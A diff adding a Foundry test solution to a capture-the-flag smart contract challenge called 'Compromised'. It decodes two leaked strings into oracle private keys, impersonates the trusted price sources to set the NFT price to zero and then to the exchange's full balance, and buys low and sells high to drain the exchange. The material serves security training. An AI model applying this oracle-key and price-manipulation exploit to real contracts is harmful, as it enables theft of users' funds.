@@ -77,6 +77,48 @@ contract Compromised is Test {
          * EXPLOIT START *
          */
 
+         // Hex string: 4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134
+        // Base64 string: MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+        // Decoded private key: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+    
+        // Hex string: 4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535
+        // Base64 string: MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+        // Decoded private key: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+
+        uint256 privateKey1 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
+        uint256 privateKey2 = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
+    
+        address trustedSource1 = vm.addr(privateKey1);
+        address trustedSource2 = vm.addr(privateKey2);
+    
+        // Set low price
+        vm.prank(trustedSource1);
+        trustfulOracle.postPrice("DVNFT", 0);
+        vm.prank(trustedSource2);
+        trustfulOracle.postPrice("DVNFT", 0);
+    
+        // Buy the NFT at the manipulated low price
+        vm.prank(attacker);
+        uint256 tokenId = exchange.buyOne{value: 1}();
+    
+        // Set high price
+        vm.prank(trustedSource1);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(trustedSource2);
+        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+    
+        // Sell the NFT at the manipulated high price
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+        vm.stopPrank();
+    
+        // reset the price to the original value (not necessary for the exploit)
+        vm.prank(trustedSource1);
+        trustfulOracle.postPrice("DVNFT", 999000000000000000000);
+        vm.prank(trustedSource2);
+        trustfulOracle.postPrice("DVNFT", 999000000000000000000);
+
         /**
          * EXPLOIT END *
          */
